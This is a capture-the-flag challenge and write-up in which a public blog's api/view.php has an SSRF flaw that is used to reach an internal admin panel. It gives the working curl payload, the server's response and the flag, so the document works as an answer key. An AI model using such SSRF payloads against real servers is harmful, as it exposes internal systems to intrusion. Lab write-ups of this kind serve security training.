# E Corp.
Your task is to access the admin panel of E Corp. servers. The admin panel is located at `http://admin-panel.local` but it's not accessible from the outside.

E Corp. also has a public blog running at `https://ecorpblog.uctf.ir`

Your task is to access the admin panel.

# Write Up
It's possible to access `http://admin-panel.local` by exploiting an SSRF vulnerability on `api/view.php`

```
$ curl https://ecorpblog.uctf.ir/api/view.php -d '{ "post": "http://admin-panel.local" }'
{"status":"success","post":"uctf{4z174_1n_urm14}"}
```

# Flag
uctf{4z174_1n_urm14}

# Categories
- [x] Web
- [ ] Reverse
- [x] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

# Points
| Warm up | This Challenge | Evil |
| ------- |:--------------:| ----:|
| 25      | 200-250        | 500  |

# Resources
- `blog` contains files for the server hosting E Corp. Blog website.
- `flag` contains files for the server hosting the flag.